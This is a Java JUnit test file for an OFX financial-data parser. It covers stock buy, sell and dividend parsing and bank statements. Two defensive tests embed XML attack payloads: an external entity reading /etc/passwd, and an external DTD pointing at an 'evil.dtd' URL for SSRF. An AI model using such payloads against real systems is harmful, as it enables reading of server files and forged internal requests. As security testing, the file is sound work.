package com.wealthview.importmodule.ofx;

import org.junit.jupiter.api.Test;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.math.BigDecimal;
import java.nio.charset.StandardCharsets;
import java.time.LocalDate;

import static org.assertj.core.api.Assertions.assertThat;

class OfxTransactionParserTest {

    private final OfxTransactionParser parser = new OfxTransactionParser();

    private static final String OFX_INVESTMENT_BUY = """
            OFXHEADER:100
            DATA:OFXSGML
            VERSION:102
            SECURITY:NONE
            ENCODING:USASCII
            CHARSET:1252
            COMPRESSION:NONE
            OLDFILEUID:NONE
            NEWFILEUID:NONE

            <OFX>
            <SIGNONMSGSRSV1>
            <SONRS>
            <STATUS><CODE>0<SEVERITY>INFO</STATUS>
            <DTSERVER>20250115
            <LANGUAGE>ENG
            </SONRS>
            </SIGNONMSGSRSV1>
            <INVSTMTMSGSRSV1>
            <INVSTMTTRNRS>
            <TRNUID>0
            <STATUS><CODE>0<SEVERITY>INFO</STATUS>
            <INVSTMTRS>
            <DTASOF>20250115
            <CURDEF>USD
            <INVTRANLIST>
            <DTSTART>20240101
            <DTEND>20250115
            <BUYSTOCK>
            <INVBUY>
            <INVTRAN>
            <FITID>12345
            <DTTRADE>20250110
            </INVTRAN>
            <SECID><UNIQUEID>037833100<UNIQUEIDTYPE>CUSIP</SECID>
            <UNITS>10
            <UNITPRICE>185.50
            <TOTAL>-1855.00
            <SUBACCTSEC>CASH
            <SUBACCTFUND>CASH
            </INVBUY>
            <BUYTYPE>BUY
            </BUYSTOCK>
            </INVTRANLIST>
            </INVSTMTRS>
            </INVSTMTTRNRS>
            </INVSTMTMSGSRSV1>
            <SECLISTMSGSRSV1>
            <SECLIST>
            <STOCKINFO>
            <SECINFO>
            <SECID><UNIQUEID>037833100<UNIQUEIDTYPE>CUSIP</SECID>
            <SECNAME>APPLE INC
            <TICKER>AAPL
            </SECINFO>
            </STOCKINFO>
            </SECLIST>
            </SECLISTMSGSRSV1>
            </OFX>
            """;

    private static final String OFX_INVESTMENT_SELL = """
            OFXHEADER:100
            DATA:OFXSGML
            VERSION:102
            SECURITY:NONE
            ENCODING:USASCII
            CHARSET:1252
            COMPRESSION:NONE
            OLDFILEUID:NONE
            NEWFILEUID:NONE

            <OFX>
            <SIGNONMSGSRSV1>
            <SONRS>
            <STATUS><CODE>0<SEVERITY>INFO</STATUS>
            <DTSERVER>20250115
            <LANGUAGE>ENG
            </SONRS>
            </SIGNONMSGSRSV1>
            <INVSTMTMSGSRSV1>
            <INVSTMTTRNRS>
            <TRNUID>0
            <STATUS><CODE>0<SEVERITY>INFO</STATUS>
            <INVSTMTRS>
            <DTASOF>20250115
            <CURDEF>USD
            <INVTRANLIST>
            <DTSTART>20240101
            <DTEND>20250115
            <SELLSTOCK>
            <INVSELL>
            <INVTRAN>
            <FITID>67890
            <DTTRADE>20250112
            </INVTRAN>
            <SECID><UNIQUEID>037833100<UNIQUEIDTYPE>CUSIP</SECID>
            <UNITS>-5
            <UNITPRICE>190.00
            <TOTAL>950.00
            <SUBACCTSEC>CASH
            <SUBACCTFUND>CASH
            </INVSELL>
            <SELLTYPE>SELL
            </SELLSTOCK>
            </INVTRANLIST>
            </INVSTMTRS>
            </INVSTMTTRNRS>
            </INVSTMTMSGSRSV1>
            <SECLISTMSGSRSV1>
            <SECLIST>
            <STOCKINFO>
            <SECINFO>
            <SECID><UNIQUEID>037833100<UNIQUEIDTYPE>CUSIP</SECID>
            <SECNAME>APPLE INC
            <TICKER>AAPL
            </SECINFO>
            </STOCKINFO>
            </SECLIST>
            </SECLISTMSGSRSV1>
            </OFX>
            """;

    private static final String OFX_INVESTMENT_INCOME = """
            OFXHEADER:100
            DATA:OFXSGML
            VERSION:102
            SECURITY:NONE
            ENCODING:USASCII
            CHARSET:1252
            COMPRESSION:NONE
            OLDFILEUID:NONE
            NEWFILEUID:NONE

            <OFX>
            <SIGNONMSGSRSV1>
            <SONRS>
            <STATUS><CODE>0<SEVERITY>INFO</STATUS>
            <DTSERVER>20250115
            <LANGUAGE>ENG
            </SONRS>
            </SIGNONMSGSRSV1>
            <INVSTMTMSGSRSV1>
            <INVSTMTTRNRS>
            <TRNUID>0
            <STATUS><CODE>0<SEVERITY>INFO</STATUS>
            <INVSTMTRS>
            <DTASOF>20250115
            <CURDEF>USD
            <INVTRANLIST>
            <DTSTART>20240101
            <DTEND>20250115
            <INCOME>
            <INVTRAN>
            <FITID>11111
            <DTTRADE>20250120
            </INVTRAN>
            <SECID><UNIQUEID>037833100<UNIQUEIDTYPE>CUSIP</SECID>
            <INCOMETYPE>DIV
            <TOTAL>24.50
            <SUBACCTSEC>CASH
            <SUBACCTFUND>CASH
            </INCOME>
            </INVTRANLIST>
            </INVSTMTRS>
            </INVSTMTTRNRS>
            </INVSTMTMSGSRSV1>
            <SECLISTMSGSRSV1>
            <SECLIST>
            <STOCKINFO>
            <SECINFO>
            <SECID><UNIQUEID>037833100<UNIQUEIDTYPE>CUSIP</SECID>
            <SECNAME>APPLE INC
            <TICKER>AAPL
            </SECINFO>
            </STOCKINFO>
            </SECLIST>
            </SECLISTMSGSRSV1>
            </OFX>
            """;

    private static final String OFX_BANK_STATEMENT = """
            OFXHEADER:100
            DATA:OFXSGML
            VERSION:102
            SECURITY:NONE
            ENCODING:USASCII
            CHARSET:1252
            COMPRESSION:NONE
            OLDFILEUID:NONE
            NEWFILEUID:NONE

            <OFX>
            <SIGNONMSGSRSV1>
            <SONRS>
            <STATUS><CODE>0<SEVERITY>INFO</STATUS>
            <DTSERVER>20250115
            <LANGUAGE>ENG
            </SONRS>
            </SIGNONMSGSRSV1>
            <BANKMSGSRSV1>
            <STMTTRNRS>
            <TRNUID>0
            <STATUS><CODE>0<SEVERITY>INFO</STATUS>
            <STMTRS>
            <CURDEF>USD
            <BANKACCTFROM>
            <BANKID>123456789
            <ACCTID>1234567890
            <ACCTTYPE>CHECKING
            </BANKACCTFROM>
            <BANKTRANLIST>
            <DTSTART>20240101
            <DTEND>20250115
            <STMTTRN>
            <TRNTYPE>CREDIT
            <DTPOSTED>20250105
            <TRNAMT>5000.00
            <FITID>2025010501
            <MEMO>Direct Deposit
            </STMTTRN>
            <STMTTRN>
            <TRNTYPE>DEBIT
            <DTPOSTED>20250110
            <TRNAMT>-500.00
            <FITID>2025011001
            <MEMO>Wire Transfer
            </STMTTRN>
            </BANKTRANLIST>
            </STMTRS>
            </STMTTRNRS>
            </BANKMSGSRSV1>
            </OFX>
            """;

    @Test
    void parse_investmentBuy_extractsBuyTransaction() throws IOException {
        var result = parser.parse(toStream(OFX_INVESTMENT_BUY));

        assertThat(result.transactions()).hasSize(1);
        var txn = result.transactions().get(0);
        assertThat(txn.type()).isEqualTo("buy");
        assertThat(txn.symbol()).isEqualTo("AAPL");
        assertThat(txn.date()).isEqualTo(LocalDate.of(2025, 1, 10));
        assertThat(txn.quantity()).isEqualByComparingTo(new BigDecimal("10"));
        assertThat(txn.amount()).isEqualByComparingTo(new BigDecimal("1855.00"));
        assertThat(result.errors()).isEmpty();
    }

    @Test
    void parse_investmentSell_extractsSellTransaction() throws IOException {
        var result = parser.parse(toStream(OFX_INVESTMENT_SELL));

        assertThat(result.transactions()).hasSize(1);
        var txn = result.transactions().get(0);
        assertThat(txn.type()).isEqualTo("sell");
        assertThat(txn.symbol()).isEqualTo("AAPL");
        assertThat(txn.date()).isEqualTo(LocalDate.of(2025, 1, 12));
        assertThat(txn.quantity()).isEqualByComparingTo(new BigDecimal("5"));
        assertThat(txn.amount()).isEqualByComparingTo(new BigDecimal("950.00"));
    }

    @Test
    void parse_investmentIncome_extractsDividendTransaction() throws IOException {
        var result = parser.parse(toStream(OFX_INVESTMENT_INCOME));

        assertThat(result.transactions()).hasSize(1);
        var txn = result.transactions().get(0);
        assertThat(txn.type()).isEqualTo("dividend");
        assertThat(txn.symbol()).isEqualTo("AAPL");
        assertThat(txn.date()).isEqualTo(LocalDate.of(2025, 1, 20));
        assertThat(txn.quantity()).isNull();
        assertThat(txn.amount()).isEqualByComparingTo(new BigDecimal("24.50"));
    }

    @Test
    void parse_bankStatement_extractsDepositsAndWithdrawals() throws IOException {
        var result = parser.parse(toStream(OFX_BANK_STATEMENT));

        assertThat(result.transactions()).hasSize(2);

        var deposit = result.transactions().get(0);
        assertThat(deposit.type()).isEqualTo("deposit");
        assertThat(deposit.date()).isEqualTo(LocalDate.of(2025, 1, 5));
        assertThat(deposit.amount()).isEqualByComparingTo(new BigDecimal("5000.00"));
        assertThat(deposit.symbol()).isNull();

        var withdrawal = result.transactions().get(1);
        assertThat(withdrawal.type()).isEqualTo("withdrawal");
        assertThat(withdrawal.date()).isEqualTo(LocalDate.of(2025, 1, 10));
        assertThat(withdrawal.amount()).isEqualByComparingTo(new BigDecimal("500.00"));
    }

    @Test
    void parse_invalidOfx_returnsErrorsGracefully() throws IOException {
        var result = parser.parse(toStream("this is not an ofx file"));

        assertThat(result.transactions()).isEmpty();
        assertThat(result.errors()).isNotEmpty();
    }

    @Test
    void parse_xxePayload_doesNotLeakFileContent() throws IOException {
        // OFX 2.x is XML-based. A malicious client could supply a DOCTYPE with
        // an external entity that reads /etc/passwd or exfiltrates to a URL.
        // The parser must not resolve external entities.
        var xxePayload = """
                OFXHEADER:100
                DATA:OFXSGML
                VERSION:200
                SECURITY:NONE
                ENCODING:UTF-8
                CHARSET:NONE
                COMPRESSION:NONE
                OLDFILEUID:NONE
                NEWFILEUID:NONE

                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE OFX [
                  <!ENTITY xxe SYSTEM "file:///etc/passwd">
                ]>
                <OFX>
                  <SIGNONMSGSRSV1>
                    <SONRS>
                      <STATUS><CODE>0</CODE><SEVERITY>INFO</SEVERITY><MESSAGE>&xxe;</MESSAGE></STATUS>
                      <DTSERVER>20250115</DTSERVER>
                      <LANGUAGE>ENG</LANGUAGE>
                    </SONRS>
                  </SIGNONMSGSRSV1>
                </OFX>
                """;

        var result = parser.parse(toStream(xxePayload));

        var combinedOutput = new StringBuilder();
        result.transactions().forEach(t -> combinedOutput.append(t.toString()));
        result.errors().forEach(e -> combinedOutput.append(e.toString()));

        assertThat(combinedOutput.toString())
                .as("external entity must not be resolved — /etc/passwd content must not appear in parser output")
                .doesNotContain("root:")
                .doesNotContain("/bin/bash")
                .doesNotContain("daemon:");
    }

    @Test
    void parse_externalDtd_doesNotFetchRemote() throws IOException {
        // If the parser honors external DTDs, a crafted file can force an HTTP
        // callback (SSRF) or hang on a slow endpoint. We point at a reserved
        // TEST-NET-1 address (RFC 5737) which should never resolve.
        var dtdPayload = """
                OFXHEADER:100
                DATA:OFXSGML
                VERSION:200
                SECURITY:NONE
                ENCODING:UTF-8
                CHARSET:NONE
                COMPRESSION:NONE
                OLDFILEUID:NONE
                NEWFILEUID:NONE

                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE OFX SYSTEM "http://192.0.2.1/evil.dtd">
                <OFX>
                  <SIGNONMSGSRSV1>
                    <SONRS>
                      <STATUS><CODE>0</CODE><SEVERITY>INFO</SEVERITY></STATUS>
                      <DTSERVER>20250115</DTSERVER>
                      <LANGUAGE>ENG</LANGUAGE>
                    </SONRS>
                  </SIGNONMSGSRSV1>
                </OFX>
                """;

        // Must complete quickly — if the parser tried to fetch the DTD it would
        // hang until the test timeout. Wrap in a thread-based timeout.
        var thread = new Thread(() -> {
            try {
                parser.parse(toStream(dtdPayload));
            } catch (IOException ignored) {
                // parse errors are fine; network hangs are not
            }
        });
        thread.setDaemon(true);
        thread.start();
        try {
            thread.join(5000);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        assertThat(thread.isAlive())
                .as("parser must not attempt to fetch external DTD — otherwise it hangs waiting for 192.0.2.1")
                .isFalse();
    }

    private static ByteArrayInputStream toStream(String content) {
        return new ByteArrayInputStream(content.getBytes(StandardCharsets.UTF_8));
    }
}
